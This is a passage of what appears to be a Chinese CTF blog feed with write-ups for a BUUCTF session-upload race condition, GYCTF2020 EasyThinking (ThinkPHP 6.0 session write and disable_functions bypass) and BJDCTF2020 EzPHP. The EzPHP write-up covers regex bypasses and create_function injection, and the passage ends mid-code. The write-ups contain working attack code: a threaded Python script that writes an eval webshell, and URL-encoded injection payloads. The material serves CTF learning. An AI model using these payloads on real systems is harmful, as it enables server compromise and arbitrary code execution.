“PHP_SESSION_UPLOAD_PROGRESS”</p></blockquote><ul><li><p>session.use_strict_mode=off </p><p>表示对cookie中的sessionid可控，默认off。即使没有<code>session_start()</code>，也可以自己定义PHPSESSID，并且PHP会自动初始化session，并产生一个键值，这个键值由<code>session.upload_progress.prefix</code>和<code>session.upload_progress.name</code>组成，最后被写入session文件里。比如在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：<code>/tmp/sess_flag</code></p><blockquote><p>在Linux系统中，session文件一般的默认存储位置为/tmp或/var/lib/php/session</p></blockquote></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> sys<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadinghost <span class="token operator">=</span> <span class="token string">'http://83b54a25-4b1f-4a71-9d36-be8522dc1261.node4.buuoj.cn/flflflflag.php'</span>sessid <span class="token operator">=</span> <span class="token string">'feng'</span><span class="token keyword">def</span> <span class="token function">POST</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>        session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>            host<span class="token punctuation">,</span>            data<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"PHP_SESSION_UPLOAD_PROGRESS"</span><span class="token punctuation">:</span> <span class="token string">"&lt;?php system('ls /');fputs(fopen('shell.php','w'),'&lt;?php @eval($_POST[cmd])?>');echo md5('1');?>"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            files<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"file"</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'a.txt'</span><span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'PHPSESSID'</span><span class="token punctuation">:</span> sessid<span class="token punctuation">&#125;</span>        <span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">READ</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        response <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">?file=/tmp/sess_</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sessid<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>        <span class="token comment"># 1的MD5值</span>        <span class="token keyword">if</span> <span class="token string">'c4ca4238a0b923820dcc509a6f75849b'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+++]retry'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> session<span class="token punctuation">:</span>    t1 <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>POST<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>session<span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">)</span>    t1<span class="token punctuation">.</span>daemon <span class="token operator">=</span> <span class="token boolean">True</span>  <span class="token comment"># 主线程退出时，不管子线程是否完成都随主线程退出</span>    t1<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>    READ<span class="token punctuation">(</span>session<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行一下，马就写到<code>shell.php</code>了。</p><h2 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h2><p><a href="https://syunaht.com/p/4200301947.html">利用phpinfo与文件包含进行条件竞争</a></p><p><a href="https://www.freebuf.com/news/202819.html">利用session.upload_progress进行文件包含和反序列化渗透</a></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[GYCTF2020]EasyThinking</title>
      <link href="/p/3292983066.html"/>
      <url>/p/3292983066.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键字:[session|thinkphp6.0|disable_function]</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802134114753.png" alt="image-20210802134114753"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802134245687.png" alt="image-20210802134245687"></p><p>扫了下目录，发现<a href="http://www.zip源码泄漏/">www.zip源码泄漏</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802141917354.png" alt="image-20210802141917354"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802142005356.png" alt="image-20210802142005356"></p><p>thinkphp6.0</p><p>searchsploit搜了下没啥结果</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802142053259.png" alt="image-20210802142053259"></p><p>谷歌搜搜，搜到个有关session的。</p><p>正好代码里session是可控的。</p><blockquote><p>session需要32位长度</p></blockquote><p>于是</p><p>先构造session</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802160818951.png" alt="image-20210802160818951"></p><p>比如这样，需要在登录的时候就构造，因为不登录，那就没办法search。</p><p>然后</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802160926197.png" alt="image-20210802160926197"></p><p>之后访问：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">runtime<span class="token operator">/</span>session<span class="token operator">/</span>sess_1111111111111111111111111111<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802161015328.png" alt="image-20210802161015328"></p><p>成功。</p><p>然后发个马过去，连蚁剑，发现没权限读。下面还有个readflag。明显，是要执行这个文件</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162239911.png" alt="image-20210802162239911"></p><p>phpinfo看一下禁用了很多函数，然后开始考虑绕过disable_function</p><h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>掏出蚁剑大宝贝，一个一个试过去。</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162324799.png" alt="image-20210802162324799"></p><p>一键bypass！蚁剑牛逼(破音</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162224999.png" alt="image-20210802162224999"></p><h3 id="手动"><a href="#手动" class="headerlink" title="手动"></a>手动</h3><p>接下来手动下</p><p><a href="https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php">https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</a></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162534169.png" alt="image-20210802162534169"></p><p>然后把文件上传</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162731298.png" alt="image-20210802162731298"></p><p>文件包含一下</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-GYCTF2020-EasyThinking/image-20210802162744004.png" alt="image-20210802162744004"></p><p>结束。</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> thinkphp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题笔记:[BJDCTF2020]EzPHP</title>
      <link href="/p/3645611024.html"/>
      <url>/p/3645611024.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>关键词:[create_function|get_defined_vars|正则绕过]</p><p>写了快半个月的机器人了，摸了好久的鱼，今天重新开始做web！</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160534512.png" alt="image-20210801160534512"></p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801160544721.png" alt="image-20210801160544721"></p><p>base64解一下，乱码</p><p>试试其他的</p><p>最后base32解出来<code>1nD3x.php</code></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1nD3x.php"</span><span class="token punctuation">;</span><span class="token variable">$shana</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'shana'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$passwd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br />&lt;font color=red>&lt;B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!&lt;/B>&lt;br>&lt;/font>"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'You seem to want to do something bad?'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^aqua_is_cute$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'debu'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'aqua_is_cute'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Neeeeee! Good Job!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! What do you want to do ?!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span> <span class="token keyword">as</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fxck you! I hate English!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>很多正则匹配，得耐心的一个一个来。</p><h4 id="SERVER-39-QUERY-STRING-39-绕过"><a href="#SERVER-39-QUERY-STRING-39-绕过" class="headerlink" title="$_SERVER[&#39;QUERY_STRING&#39;]绕过"></a><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>绕过</h4><p>这玩意不会url解码，所以可以用url编码绕过，需要将所有字符都url编码一下</p><p>例如<code>d</code>-&gt;<code>%64</code>，64是<code>d</code>的ascii码的16进制</p><p>这不仅检测value,key也会检测，所以除了<code>=</code>与<code>&amp;</code>,其他都可以考虑编码一下</p><h4 id="开头结尾正则匹配绕过"><a href="#开头结尾正则匹配绕过" class="headerlink" title="开头结尾正则匹配绕过"></a>开头结尾正则匹配绕过</h4><p><code>&#39;/^aqua_is_cute$/&#39;</code>匹配开头结尾，用<code>%0a</code>绕过</p><pre class="line-numbers language-none"><code class="language-none">debu&#x3D;aqua_is_cute%0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="REQUEST-正则绕过"><a href="#REQUEST-正则绕过" class="headerlink" title="$_REQUEST 正则绕过"></a><code>$_REQUEST</code> 正则绕过</h4><p>先GET后POST，可以POST的一个新值绕过</p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191441715-16278164826491.png" alt="image-20210801191441715"></p><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801191457689.png" alt="image-20210801191457689"></p><p>可见a的值在检测的时候被覆盖了。但实际上没有变。所以只需要在POST里放几个正常参数即可绕过。</p><p>而后面还有shana[]、passwd[]、flag[code]、flag[arg]，这些是数组，不会被正则匹配到，所以不需要加post里</p><h4 id="file-get-contents-file-39-debu-debu-aqua-39"><a href="#file-get-contents-file-39-debu-debu-aqua-39" class="headerlink" title="file_get_contents($file) !== &#39;debu_debu_aqua&#39;"></a><code>file_get_contents($file) !== &#39;debu_debu_aqua&#39;</code></h4><p>就用data伪协议绕过</p><pre class="line-numbers language-none"><code class="language-none">file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="sha1-绕过"><a href="#sha1-绕过" class="headerlink" title="sha1()绕过"></a><code>sha1()</code>绕过</h4><p>类似<code>md5()</code>用数组绕过</p><pre class="line-numbers language-none"><code class="language-none">shana[]&#x3D;1&amp;passwd[]&#x3D;2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>extract($_GET[&quot;flag&quot;]);</code>，来进行变量覆盖，给下面的$flag和$arg赋值用。</p><p>flag[code]=xxx,flag[arg]=xxx,</p><h4 id="create-function代码注入"><a href="#create-function代码注入" class="headerlink" title="create_function代码注入"></a>create_function代码注入</h4><p>php&lt;7.2</p><p>6.<code>create_function</code>会创建一个匿名函数（<code>lambda</code>样式),然后在内部对第二个参数执行<code>eval()</code></p><p>那如何进行代码注入了？因为他这个是用<strong>字符串拼接</strong>成代码，就类似于sql注入：</p><p>提前闭合+恶意代码+注释后面</p><p>栗子1：</p><blockquote><p>注意：第二个参数内的<strong>变量</strong>如果没有在外部声明，则需要单引号；如果在外部声明了，就用双引号。</p></blockquote><p><code>$a</code>与<code>$b</code>没有声明变量，所以用单引号。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'$a, $b'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'return($a+$b);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//func()等价于</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造:</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">+</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>   <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>栗子2：</p><p><code>$c</code>在外声明变量了，可以用双引号。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$lambda</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"return <span class="token interpolation"><span class="token variable">$c</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$lambda</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//等价于</span><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是我构造</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">func</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>      <span class="token operator">?</span>c<span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>来看题，<code>$code(&#39;&#39;, $arg);</code>很相似</p><p>所以<code>$code(&#39;&#39;, $arg); </code>，让<code>$code</code>=<code>create_function</code>，就变成</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">lambda</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$arg</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>那只需要arg=}func();//</p><p>先整理下</p><pre class="line-numbers language-none"><code class="language-none">第一个：?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua?file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61第二个debu&#x3D;aqua_is_cute%0a%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a第三个：shana[]&#x3D;1&amp;passwd[]&#x3D;2&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2第四个：flag[code]&#x3D;create_function%66%6c%61%67[%63%6f%64%65]&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><p>关于第五个，恶意代码的注入，有很多种方式。</p><p>因为<code>include &quot;flag.php&quot;;</code>,所以可以利用<code>get_defined_vars()</code>读取所有变量，</p><pre class="line-numbers language-none"><code class="language-none">第五个：flag[arg]&#x3D;&#125;var_dump(get_defined_vars());&#x2F;&#x2F;%66%6c%61%67[%61%72%67]&#x3D;%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801225458425.png" alt="image-20210801225458425"></p><p>然后需要读取<code>rea1fl4g.php</code></p><p>1.过滤了include和引号，还可以用require()</p><pre class="line-numbers language-none"><code class="language-none">&#125;require(base64_decode(cmVhMWZsNGcucGhw));var_dump(get_defined_vars());&#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/../images/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0-BJDCTF2020-EzPHP/image-20210801231507321.png" alt="image-20210801231507321"></p><p>buuctf上改了改，把flag给unset了，所以得换种办法</p><p>2.伪协议</p><pre class="line-numbers language-none"><code 